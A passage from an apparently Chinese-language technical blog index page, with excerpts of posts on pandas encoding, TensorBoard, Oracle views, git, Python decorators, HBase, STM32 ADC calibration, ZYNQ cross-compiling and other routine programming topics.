第四次查找时 high=12-1=11 low =10; middle = (10+11)/2 = 10，即80
正确的二分查找应该是一次折半后，high=middle-1 或者 low=middle+1；
所以第一次查找时 high=6,low=0; middle= (0+6)/2 = 3,即48；
第二次查找时 high=6, low =3+1; middle = (6+4)/2 = 5,即72，查出所找关键字，故答案为B、2次
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34b5ce23068271338d2c8877756b18e9/" rel="bookmark">
			Python 对数据one-hot编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
离散特征的编码分为2种情况：
连续变量的离散化处理
法1.标签的处理：
法2.计算指标/哑变量one-hot编码
结合pd.cut,处理连续变量
合并（)：要注意使用merge还是join
离散特征的编码分为2种情况： 1.我们在进行那些有大小关系的变量离散，小雨，中雨，大雨，
{“小雨”:1,“中雨”:2,“雨天”:3}，这里面有一定数量的大小关系，这种映射的讲解在法1：标签的处理
2.只是换个名字的标签处理晴天，阴天，雨天这种标签没有大小的关系，那就考虑one-hot编码，或者说产生哑变量。
连续变量的离散化处理 比如说，分数，需要将数据划分为“0到60”，“61到79”，“79到100”几个分数组。用的是pd.cut(data,bins),这里的data是我们要分割的分数数据，bins是[0,60,79,100]。类似函数可学习pd.qcut
import pandas as pd df = pd.DataFrame({"key":['green','red', 'blue'], "data1":['a','b','c'],"sorce": [33,61,99]}) bins=[0,61,80,100] cats=pd.cut(df["sorce"],bins) print(cats) group_name=["不及格","及格","优秀"] cats2=pd.cut(df["sorce"],bins,labels=group_name,right=False) #df["sorce"]为数据 #bins指定划分 #right指定区间闭合方向 #labels指定切分结果的标签 print(cats2) ############结果 0 (0, 61] 1 (0, 61] 2 (80, 100] Name: sorce, dtype: category Categories (3, object): [(0, 61] &lt; (61, 80] &lt; (80, 100]] 0 不及格 1 及格 2 优秀 Name: sorce, dtype: category Categories (3, object): [不及格 &lt; 及格 &lt; 优秀] 那我们可以设计0-60分的需要编码为1,61-79为合格，80-100为优秀，这个和上面的第一条类似，只是需要一个数据划分的步骤，详见法2的相关处理。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34b5ce23068271338d2c8877756b18e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fc71e588a2b99e6041eacfdbb10f546/" rel="bookmark">
			TensorFlow学习之TensorBoard使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：https://blog.csdn.net/u010099080/article/details/77426577
在使用tensorflow训练神经网络之后，可以输出训练日志，然后用tensorboard打开进行可视化，本文目的是整理tensorboard的使用方法以及里边曲线的含义。
1 运行过程 添加记录节点：tf.summary.scalar/image/histogram()等汇总记录节点：merged = tf.summary.merge_all()运行汇总节点：summary = sess.run(merged)，得到汇总结果日志书写器实例化： summary_writer = tf.summary.FileWriter(logdir, graph=sess.graph)，实例化的同时传入 graph 将当前计算图写入日志调用日志书写器实例对象summary_writer的add_summary(summary, global_step=i)方法将所有汇总日志写入文件调用日志书写器实例对象summary_writer的close()方法写入内存，否则它每隔120s写入一次 2 运行tensorboard tensorboard的运行很简单，只需要在终端输入tensorboard，然后带上日志目录就可以了
tensorboard --logdir=/path/to/log 运行以上命令会启动一个服务，这个服务的默认端口是6006。然后在浏览器中输入 localhost:6006或者本机IP地址如10.1.1.101:6006即可打开如图所示的界面
我们看到在主页打开的是SCALARS选项页面，该页面显示了程序运行过程中的各种监控指标，tensorboard总共提供了多种界面来可视化监控指标，包括SCALARS（标量）、GRAPHS（计算图）、IMAGES（图片）、AUDIO（音频）、DISTRIBUTIONS（数据分布）、HISTOGRAMS（直方图）、EMBEDDINGS（嵌入向量）。你用到的面板会在顶部导航栏直接显示，而其它用不到的（你代码中没有相关代码）则会收起到INACTIVE中。
其中GRAPHS可视化计算图的结构以及在计算图上的信息；IMAGES用于可视化当前使用的训练/测试图片；AUDIO显示使用的音频数据；DISTRIBUTIONS提供了对张量取值分布的可视化界面，可以直观地观察到不同层神经网络中参数的取值变化；HISTOGRAMS展示了参数取值分布于训练迭代轮数之间的关系。
3 SCALARS tf.summary.scalar(name, tensor, collections=None, family=None) ''' 可视化训练过程中随着迭代次数准确率(val acc)、损失值(train/test loss)、学习率(learning rate)、每一层的权重和偏置的统计量(mean、std、max/min)等的变化曲线 输入参数： --name：此操作节点的名字，TensorBoard 中绘制的图形的纵轴也将使用此名字 --tensor： 需要监控的变量 A real numeric Tensor containing a single value. 输出： --A scalar Tensor of type string. Which contains a Summary protobuf. ''' SCALARS面板主要用于记录诸如准确率、损失和学习率等单个值的变化趋势。在代码中用tf.summary.scalar()来将其记录到文件中。每个图的右下角都有 3 个小图标，第一个是查看大图，第二个是是否对 y 轴对数化，第三个是如果你拖动或者缩放了坐标轴，再重新回到原始位置。
页面左上是 Show data download links 和 Ignore outliers in chart scaling，这两个比较好理解，第一个就是显示数据下载链接，可以把 TensorBoard 作图用的数据下载下来，点击后可以在图的右下角可以看到下载链接以及选择下载哪一个 run 的，下载格式支持 CSV 和 JSON。第二个是排除异常点，默认选中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5fc71e588a2b99e6041eacfdbb10f546/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fb7941a8a86348261c4285c2053824f/" rel="bookmark">
			Oracle 数据库中V$、GV$、X$、V_$、GV_$之间的关系说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Oracle 数据库中V$、GV$、X$、V_$、GV_$之间的关系说明
GV$：全局视图，针对多个实例环境。
V$：针对某个实例的视图。
X$：是GV$视图的数据来源，Oracle内部表。
GV_$：是GV$的同义词。
V_$：是V$的同义词。
我们可以使用V$FIXED_VIEW_DEFINITION视图查询到V$视图和GV$视图的定义。
在$ORACLE_HOME/rdbms/admin/catalog.sql中执行了cdfixed.sql脚本。我们在这个脚本中可以找到GV_、$V_$同义词的创建。
授权举例
SQL&gt; grant select on v$mystat to HR; grant select on v$mystat to HR * 第 1 行出现错误: ORA-02030: 只能从固定的表/视图查询 已用时间: 00: 00: 00.10 SQL&gt; 为什么会出现上面的错误？
因为因为v$这类我们经常查的视图都是v_$开头视图的同义词。
所以，在进行授权时需要直接授予用户v_$的查询权限。
SQL&gt; grant select on v_$mystat to HR; 授权成功。 已用时间: 00: 00: 00.12 SQL&gt; 尤其是当需要给普通用户授予对SQL查询相关的几个重要的动态性能视图，需要了解：
v$session
v$sql
v$sql_plan
v$sql_plan_statistics
v$sql_workarea
（完）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17884a3a1c7ea6424011d178ff78e275/" rel="bookmark">
			Error merging: refusing to merge unrelated histories
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天突然想建个项目，git报了个错误无暇
fatal: refusing to merge unrelated histories -
解决办法：
git pull --allow-unrelated-histories
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b627699aea53ec5d43b2837524bd49d/" rel="bookmark">
			Python装饰器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载于https://www.cnblogs.com/Msh0923/p/8082508.html
装饰器定义 在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator）。
本质上，decorator就是一个返回函数的高阶函数。
装饰模式有很多经典的使用场景，例如插入日志、性能测试、事务处理等等，有了装饰器，就可以提取大量函数中与本身功能无关的类似代码，从而达到代码重用的目的。
装饰器的方式 1.不带参数的装饰器调用
@是装饰器的语法糖,在定义的时候使用，防止再一次的赋值
通过装饰器log在调用函数前输出调用函数的名称
def log(func): def wrapper(*args, **kw): print （"call %s !" % func.__name__） return func(*args, **kw) return wrapper @log def print1(): print （1） 由于log()是一个decorator，返回一个函数，所以，原来的print1()函数仍然存在，只是现在同名的print1变量指向了新的函数，于是调用print1()将执行新函数，即在log()函数中返回的wrapper()函数。
2.需要传入参数的装饰器
当装饰器需要传入参数时，需要三层返回函数的调用
def log(text): def decorator(func): def wrapper(*args, **kw): print （"%s %s !" % (text, func.__name__)） return func(*args, **kw) return wrapper return decorator @log("excute") def print1(): print （1） print1() 首先执行log(‘execute’)，返回的是decorator函数，再调用返回的函数，参数是print1函数，返回值最终是wrapper函数
3.解决装饰器调用函数改变 函数属性 – name 的问题
print print1.name
输出
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b627699aea53ec5d43b2837524bd49d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9b09c9204975f9669f40f203ad26980/" rel="bookmark">
			Hbase中表的操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官方文档： http://hbase.apache.org/book.html#quickstart
1.创建表
必须指定表名和ColumnFamily（列族名）名称，例如下面的'cf'就是列族名
hbase(main)&gt; create 'test','cf' 2.查看表
hbase（main）&gt;list 'test' 3.查看表的详细信息
hbase（main）&gt;decribe 'test' 4.插入数据到表
hbase(main) &gt; put 'test','1','cf:name','Thomas' hbase(main) &gt; put 'test','1','cf:sex','male' hbase(main) &gt; put 'test','2','cf:age','18' hbase(main) &gt; put 'test','2','cf:name','Janna' hbase(main) &gt; put 'test','3','cf:sex','female' hbase(main) &gt; put 'test','3','cf:age','20' 这里的数字1，2，3表示行名，每一行都有一个自己的名称，后边的数据必须要加上列族名
5.扫描表中的所有数据
hbase(main) &gt;scan 'test' hbase(main) &gt;scan 'test',{STARTROW=&gt;'2'} hbase(main) &gt;scan 'test',{STARTROW=&gt;'1',STOPROW=&gt;'2'} 注意： 这里的STARTROW和STOPROW必须大写
6.获取单行数据
hbase(main) &gt;get 'test','1','cf:name' 7.禁用表格
如果要删除表或更改其设置，以及在某些其他情况下，您需要先使用该disable命令禁用该表。您可以使用该enable命令重新启用它
hbase(main) &gt;disable 'test' 8.更新指定字段的数据
hbase(main) &gt;put 'test','1','cf:name','ys' 9.删除数据
hbase(main) &gt;delete 'test','1',''cf:name' 10.清空表数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9b09c9204975f9669f40f203ad26980/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/806932196b3157294766418144aca800/" rel="bookmark">
			基于深度学习的CT图像肺结节自动检测技术一——数据预处理（归一化，数据增强，数据标记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、读取图片dicom —&gt;截取像素 —&gt;归—化(0,1) —&gt;存储为png二、图像增强：（旋转，平移）三、准备U-net训练数据—数据标记 开发环境 Anaconda:jupyter notebook /pycharm pip install SimpleItk # 读取CT医学图像 pip install tqdm # 可扩展的Python进度条，封装迭代器 pip install pydicom # 用于读取 dicom 图片 pip install opencv-python 一、读取图片dicom —&gt;截取像素 —&gt;归—化(0,1) —&gt;存储为png """ 读取dicom图像并将其转换为png图像 读取某文件夹内的所有dicom文件 :param src_dir: dicom文件夹路径 :return: dicom list """ import os import SimpleITK import dicom import numpy as np import cv2 from tqdm import tqdm def is_dicom_file(filename): #判断某文件是否是dicom格式的文件 file_stream = open(filename, 'rb') file_stream.seek(128) data = file_stream.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/806932196b3157294766418144aca800/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ce77ffe28de16f30cf633af8dc5edb7/" rel="bookmark">
			Debian9.5解决在root用户下启用VNC后lightdm&#43;Xfce4只能使用root登录，其他用户无法登陆...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Debian9.5解决在root用户下启用VNC后lightdm+Xfce4只能使用root登录，其他用户无法登陆
最近在研究debian9.5 VNC的问题，当VNC使用tightVNC或tigerVNC软件时候，在root用户下通过命令vncserver启动vnc服务后会遇到
进入桌面的时候，使用root可以进入XFCE桌面，使用其他用户的时候，输入用户名和密码，屏幕黑了一下，然后又返回了输入用户名密码的界面，
怀疑是.Xauthority文件的权限问题，产看普通用户主目录下.Xauthority（~/.Xauthority）文件的权限，发现这个文件的所属组和所有者都变成了root。
所以普通用户不能读取这个文件，从而不能启动桌面环境，把~/.Xauthority文件的所有者和所属组改回普通用户
普通用户laopi为例：
root@debian:/home/laopi# chown laopi .Xauthority #更改所有者
root@debian:/home/laopi# chgrp laopi .Xauthority #更改所属组
更改完事重启电脑即可
转载于:https://www.cnblogs.com/pipci/p/9690140.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0007498c0fdaaf9fcf00c62cd7232739/" rel="bookmark">
			STM32 ADC采样不准怎么办
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在使用STM32L011的ADC时，发现ADC采样值极其不准确。经过查找资料，和反复测试，总算摸出点门道。
如将VDDA接到VDD，那么电源的波动会极大的影响ADC精度。
不过使用内部参考电压可以计算实际的VDDA电压。
说明：
VREFINT_CAL：芯片出厂时固化在存储器中的。使用时需要通过软件读取。
VREFINT_DATA：ADC读取VREFINT（内部参考电压通道ch17）得到的值，每次采样序列，将ch17一并采集，用来后续的AD值补偿计算。
如何读取VREFINT_CAL? 首先，找到芯片的datasheet，是所使用的那款芯片的数据手册，因为同一系列的不同芯片，可能存在区别。例如，我需要找到的datasheet标题是这个 搜索：VREFINT_CAL 得到VREFINT_CAL的地址后，使用语句
#define VREF_CAL *(__IO uint16_t *)(0x1FF80078) 然后data1 = VREF_CAL；就可以了。
怎样计算得到一个与电源电压无关的绝对精确的AD值？ 使用这个公式就可以了。
说明：
VREFINT_CAL：使用前述的读取语句data1 = VREF_CAL；从芯片存储器中读出；
ADC_DATAx：你需要测量的通道，使用ADC读出；
VREFINT_DATA：前述，内部参考电压通道（ch17）读出的值；
full_SCALE：上面已经解释很好了。取值2^n-1，n是分辨率。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d66a98f7c7ce7897307838459008fcd/" rel="bookmark">
			软件工程之软件测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【前言】 一个好的软件一定离不开软件测试，只有在测试的过程中发现尽可能多的错误，才能保证软件是否是真的好。我认为软件测试是软件开发过程最重要的一环。
对于本章我将以下图来讲。
一、目的和原则 测试的目的是为了发现尽可能多的缺陷，不是为了说明软件中没有缺陷。成功的测试在于发现了迄今尚未发现的缺陷，它能有效地揭示潜伏在软件里的缺陷。
据统计测试工作量要占软件开发总成的40%到50%以上。
1.目的： （1）测试是程序的执行过程，目的在于发现错误。
（2）一个好的测试用例在于能发现至今未发现的错误
（3）一个成功的测试是发现了至今未发现的错误的测试
2.原则： 尽早地和不断地进行软件测试
由测试输入数据和对应地预期输出结果这两部分组成
程序员应避免检查自己地程序
二、黑白盒测试 1.黑盒测试： 主要检查所有功能。
黑盒测试着眼于程序外部结构，不考虑内部逻辑结构，主要针对软件界面和软件功能进行测试。
最大的局限就是只能测试功能是否正确，但是无法检测错在哪里。黑盒测试是以用户的角度。
（测试方法）
等价类划分
边界值分析
错误推测发
因果图
2.白盒测试： 全面了解程序内部逻辑结构、对所有逻辑路径进行测试。跟黑盒测试正好相反，可以清楚的看到加工的结构，可以看清程序的主要逻辑，一 一进行测试。
（测试方法）
静态测试：
不要求在计算机上实际执行所测程序，主要以一些人工的模拟技术对软件进行分析和测试
动态测试：
通过输入一组预先按照一定的测试准则构造的实例数据来动态运行程序，而达到发现程序错误的过程。在动态分析技术中,最重要的技术是路径和分支测试。
三、软件测试策略 测试过程按4个步骤进行，即单元测试，组装测试、确认测试和系统测试。
1.单元测试 单元测试又称为模块测试，是针对软件设计的最小单位——程序模块，进行正确性检验的测试工作。
2.组装测试 通常，把模块组装成为系统的方式有两种：一次性组装方式 和 增殖式组装方式
（1）自顶向下的增殖方式
（2）自底向上的增殖方式
（3）混合增殖式测试
3.确认测试 确认测试又称有效性测试。任务是验证软件的功能和性能及其它特性是否与用户的要求一致。
4.系统测试 是将通过确认测试的软件，作为整个基于计算机系统的一个元素，与计算机硬件、外设、某些支持软件、数据和人员等其它系统元素结合在一起，在实际运行环境下，对计算机系统进行一系列的组装测试和确认测试。
α测试和β测试 α测试是由一个用户在开发环境下进行的测试，也可以是公司内部的用户在模拟实际操作环境下进行的测试
β测试是由软件的多个用户在实际使用环境下进行的测试。这些用户返有关错误信息给开发者
四、测试种类 功能测试、可靠性测试、强度测试（敏感式测试）、性能测试、恢复测试、启动/停止测试、配置测试、安全性测试、可使用性测试、可支持性测试、安装测试、过程测试、互连测试、兼容性测试、容量测试、文档测试。
五、调试 原则： （1）.用头脑去分析思考与错误征兆有关的信息
（2）.避开死胡同。
（3）.只把调试工具当做辅助助手手段来使用。
（4）.避免用试探法，最多只能把它当做最后手段。
（5）修改错误的原则
（6）在出现错误的地方，很可能还有别的错误。
（7）当修正一个错误的同时有可能会引入新的错误。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83950001e1e1eaa1fe254f197862b474/" rel="bookmark">
			MTCNN实现流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MTCNN实现流程 文章：https://arxiv.org/pdf/1604.02878.pdf
code：
1、mxnet上的实现：https://github.com/Seanlinx/mtcnn
2、tensorflow上的实现：https://github.com/AITTSMD/MTCNN-Tensorflow
3、pytorch上的实现： https://github.com/TropComplique/mtcnn-pytorch
4、caffe上的实现： https://github.com/CongWeilin/mtcnn-caffe
Tips： 个人建议在看这篇文章的时候，对照着pytorch的实现代码理解，尤其是里面的 try_mtcnn_step_by_step.ipynb 非常有助于理解整个文章的流程。
流程图 网络结构图 P-Net即Proposal net用于初始候选框提取
R-Net即refinement net用于进一步精简第一步的候选框
O-Net即output net用于输出最终的人脸框和5个landmark点
注意：P-net是个全卷积神经网络，因此可以输入不同大小的图像
具体流程（inference阶段） 1、对于给定的输入图像，进行scale操作，得到若干个不同scale的输入图像，这一步的目的是能够针对不同大小人脸进行候选框的检测
2-1、将不同scale的图像输入到P-Net中，注意，P-Net中的12123的输入只是一个示意图，代表对于图像中的1212的区域，经过P-Net的卷积后，就变成了一个11，而因为输入的图像大小不同，因此输出的大小也不同，假设输出的大小为wh，则输出的每个点都对应于原图中的一个1212的大小的区域。
2-2、设定阈值，根据face classification的结果，选出可能含有目标框的点
2-3、将这些在不同尺度下可能是目标框的点映射到原始没有经过scale的图中，得到了很多候选区域。
2-4、使用nms算法对目标框进行筛选，并且根据P-Net中输出的offset（对应bounding box regression）对候选框进行微调，校准。
3、将上一步得到所有候选框提取出来，并resize到24*24的大小，输入至R-Net中，并根据face classification的值，进一步对候选进行筛选，类似于2-4中的操作，对目标框位置进行筛选校准
4、类似于第3步的操作，进一步对目标框进行筛选，并得到最终的输出结果，并且根据Facial landmark的输出得到5个landmark。
注意，上述步骤中不同与上图的部分是，在P-Net和R-Net中，都没有输出Facial landmark localization，只在最终的O-Net中输出了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/caf8a2cc20baa2aab729f7c613d16a0a/" rel="bookmark">
			HTML制作百度首页
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先给出我的网页成品图：
先说我的网页布局的几个要点:
为了防止各个块之间互相造成影响，我们几乎整个网页都用div模块组合而成.为了在不同分辨率的屏幕和缩放的网页上保持原网页各元素相对位置不产生改变，居中的要么选择&lt;center&gt;居中，要么使用margin属性，不过要使用百分比。小图标都是用的截图抓取，使用div包含其，然后调整布局就可以。具体字体大小，字体颜色等到百度页面F12开发者模式抓取就可以了。 网页布局的分块：
top分块：包含新闻，hao123等div，input模块也在其中。百度图标分块：&lt;center&gt;居中。复合模块：包含输入框，摄像机图片div，百度一下提交框三个组成。此处因为设计的问题并不好看，可以进行改进，改进方法如下: 先使用一个大的div包含上述所提到的三个模块。输入框居中且去边框。相机图片居中。后直接跟提交框，改变提交框像素以和div符合。 end模块：包含二维码和后两行。我将二维码看作一个div，下面两行各看作一个div，其中的每组文字也看成一组div，然后根据观察的像素调整div大小进行适配组合以达到效果。但不建议采用此方法。最后两行div内，各行中每组文字都用&lt;a&gt;元素包含，有空格处用&amp;nbsp调整就好。 form表单提交的action为https://www.baidu.com/s，为什么要加s呢，因为我们搜索是模拟提交百度搜索请求。
使用form表单提交请求，?后附加的参数name为input的name，value为input中输入的值，name=value。而我们观察上方图片，可以发现?后加的是wd=CSDN,所以我们使input得name为wd即可。
以下为代码：
&lt;html&gt; &lt;head&gt; &lt;title&gt; 百度一下,你就知道 &lt;/title&gt; &lt;link href="../images/icon.ico" rel="shortcut icon" type="image/x-icon"/&gt; &lt;style&gt; .top{ height:100px; width:100%; } .menu{ text-decoration:underline; height:50px; width:50px; line-height:50px; float:right; font-size:13px; } .more{ float:right; height:50px; width:50px; font-size:14px; margin-right:20px; margin-top:15px; } .bTitle{ width:100%; margin-top:10%; } ._all{ height:40px; width:645px; } ._in{ float:left; height:40px; width:500px; } ._photo{ height:40px; width:40px; margin-left:-2px;	float:left;	} ._search{ float:left; } ._bottom{ margin-top:13%; width:100%; } ._dimension{ width:100%; height:108px; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/caf8a2cc20baa2aab729f7c613d16a0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce109751e95595d9fb5a1e28211a31f6/" rel="bookmark">
			如何判断LabVIEW当前VI运行在哪种模式下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开发LabVIEW应用程序时，有时需要知道当前VI运行于哪种模式，是在开发模式下（开发环境）运行的还是在已经生成exe文件后运行的，以下为检测方法。
1、 在程序框图中放置一个“VI服务器引用”节点，点击节点选择“本应用程序”，如下图所示。
2、在程序框图中放置一个属性节点，将“本应用程序”的输出连接到“属性节点”的输入端，设置属性为“应用程序/类别”，如下图所示。
3、 输出“类别属性节点”就知道当前运行VI在哪种模式下了。如下图所示。
应用案例
由于VI某些设置在开发模式和在运行exe模式下是不一样的，知道了当前VI处于哪种运行模式，可据此正确处理设置。如要打开当前VI目录下（本文示例中VI所在目录为项目根目录）一个文本文件并读取文件内容，选用相对路径方法，在开发模式下路径关系是正确的，但在执行EXE模式下由于系统增加一级“应用程序名.exe”目录，相对路径关系就不正确了，可根据运行模式分别设置路径关系。
开发模式读取文本文件，见下图。
运行exe模式下读取文本文件（注意需两次拆分路径才能找到运行程序目录下的文本文件 ），见下图。
撰写此文主要是备忘，也希望对读者有所帮助。
案例源代码在这里，欢迎下载使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8017e486655e81d4a12267a9a1059439/" rel="bookmark">
			JS模块化开发-使js更加规范
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么会有模块化 命名冲突：当项目由团队进行协作开发的时候，不同开发人员的变量和函数命名可能相同；即使是一个开发，当开发周期比较长的时候，也有可能会忘记之前使用了什么变量，从而导致重复命名，导致命名冲突。
文件依赖：代码重用时，引入 js 文件的数目可能少了，或者引入的顺序不对，比如使用 boostrap 的时候，需要引入 jQuery，并且 jQuery 的文件必须要比 boostrap 的 js 文件先引入。
代码耦合度过高：如今讲究的是效率与速度，特别是在进行混合式APP开发时，如果代码重复率过高，则会导致本地资源包过大，从而无限降低了资源包的大小，也会影响代码 的执行效率等。
模块化开发又有哪些好处呢？ 提升开发效率：代码方便重用，别人开发的模块直接拿过来就可以使用，不需要重复开发法类似的功能。
方便后期维护：代码方便重用，别人开发的模块直接拿过来就可以使用，不需要重复开发法类似的功能。
那么如何进行模块化开发呢？ 有这么几种方式 1、require方式（AMD模式）
test.js // 首先使用define进行定义 define(function(){ function fun1(){ alert("it works"); } fun1(); }) // 在页面中使用require进行引用 require(["js/a"]); requireJs 的问题在于，加在一个模块时，会预先加载该模块的所有依赖模块，但是这些依赖很可能一开始并不用到。同时依赖写起来一长串，也很麻烦。比较好的是 AMD 保留了 commonJs 中的 require、exprots、module3 个功能，可以不把以来都写在 dependencies 中，而是在需要时使用 require 引入。
2、后起之秀SeaJs（CMD模式）
引入 sea.js 库定义模块define(function(require, exports, module){模块代码});require(‘模块 id’)seajs.use(‘模块 id’,function( 模块对象){业务代码}); 3、ES2015 模块标准
ES6 考虑了模块化，使用 import 和 export，代码更加简洁，还有许多新特性让开发更加方便。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7a7d9804ca0503e658e952e5ee726d2/" rel="bookmark">
			Ubuntu16.04主机安装基于ZYNQ的QT交叉编译库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu16.04主机尝试安装基于ZYNQ的QT交叉编译库 前言基于vivado2016.4 SDK的交叉编译环境主机Linux上安装vivado2016.4版本qtcreator上添加基于ZYNQ的交叉编译工具基本环境参考资料QT4.8.5安装过程QT4.8.5交叉编译库安装制作QT库镜像记 前言 所谓交叉编译，当前项目下，即在Linux主机上编译ZYNQ-arm-Linux系统的可执行文件，由于在ZYNQ上编译速度非常慢，影响编程效率，最好的办法是在Linux主机上调试代码并直接生成可以在ZYNQ板子上运行的可执行文件。术语上，Linux主机称为主机，ZYNQ板子称为目标机，两者之所以不同，是由于架构的问题。虽然两者操作系统一样，但是Linux主机是x86或者x32的，而ZYNQ的Linux是跑在arm内核上的，各自的编译器是不一样的，所使用的库也不一样。
Xilinx配置整合了交叉编译工具即arm-xilinx-Linux-gnueabi-系列，下面的资料民间链接第二条的第一步是该交叉编译链的安装，不过版本有点旧，个人一开始不懂也是安装的这个交叉编译链，但是，目前（2018/9/19），尝试去下载更新的交叉编译链，官网提供链接（GNU TOOL）下面没有找到，http://xilinx.wikidot.com/zynq-tools 该文所说，这个arm-xilinx-Linux-gnueabi是集成在SDK里面的，可以单独下载，然而并没有search到。但是尝试安装完整个VIVADO的SDK之后，在XIlinx/sdk/2016.4/gnu/arm/lin/bin里面可以看到已经生成了交叉编译工具。
基于vivado2016.4 SDK的交叉编译环境 在Linux主机上安装完vivado2016.4 SDK版本之后，可以在XIlinx/sdk/2016.4/gnu/arm/lin/bin里面找到交叉编译所需要的工具，那么可以直接把环境变量定位到这里就可以。
1、第一种方法
实际上，Xilinx早就给你想好了，安装好vivado的sdk之后，直接source 安装文件下的settings64.sh就可以了。
source /Music/Xilinx/SDK/2016.4/settings64.sh arm-xilinx-linux-gnueabi-gcc -v //测试一下，出现版本是4.9 第二种方法当没有看见
2、第二种方法
打开终端（ROOT）
gedit /etc/bash.bashrc 开头第二句添加如下
export ARCH=arm export CROSS_COMPILE=arm-xilinx-linux-gnueabi- export PATH=/Music/Xilinx/SDK/2016.4/gnu/arm/lin/bin/:$PATH 记得source /etc/bash.bashrc
个人把VIVADO安装在/Music下，所以前面路径部分按照自己安装位置修改。
修改完之后查看版本如下
arm-xilinx-linux-gnueabi-gcc -v 可以看到版本是4.9.2，比下面百度云盘提供的更新。可以编写一个helloworld测试一下这个交叉编译工具是否可以用，然后把生成的可执行文件移动到ZYNQ上看是否可以编译。
Ubuntu16.04实际上还有一个更加简单的方式，直接在命令行输入
sudo apt-get install gcc-arm-linux-gnueabihf sudo apt-get install g++-arm-linux-gnueabihf 在usr/bin可以看到该编译器，交叉编译时，直接用(path路径里本来就配置了usr/bin)就是了。
主机Linux上安装vivado2016.4版本 1、在http://www.xilinx.com/support/download/index.html/content/xilinx/en/downloadNav/vivado-design-tools/archive.html 上找到
下载，个人试过上一个的Linux安装工具，实际上由于网络问题或者其他，总是会在中途中断，只有这个下载正常，而且可以迅雷下载，美滋滋～.～。
注意解压需要在LINUX下解压。如果在Windows下下载完毕，拷贝到Linux之后，在压缩包文件下执行
tar zxvf Xilinx_Vivado_SDK__2016.4_0124_1.tar.gz sudo su cd Xilinx_Vivado_SDK__2016.4_0124_1 ./xsetup 个人基本要用到的都装上了。
哦对了，别忘了安装32位的编译库，ubuntu16.04的32位库如下
sudo apt-get install lib32ncurses5 ​ sudo apt-get install lib32z1 安装过程出现的yes or no全部yes。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7a7d9804ca0503e658e952e5ee726d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efead4c7fb7af488a44ff7a414cc08a5/" rel="bookmark">
			如何使用RedisTemplate访问Redis数据结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.jianshu.com/p/7bf5dc61ca06/
Redis 数据结构简介 Redis 可以存储键与5种不同数据结构类型之间的映射，这5种数据结构类型分别为String（字符串）、List（列表）、Set（集合）、Hash（散列）和 Zset（有序集合）。
下面来对这5种数据结构类型作简单的介绍：
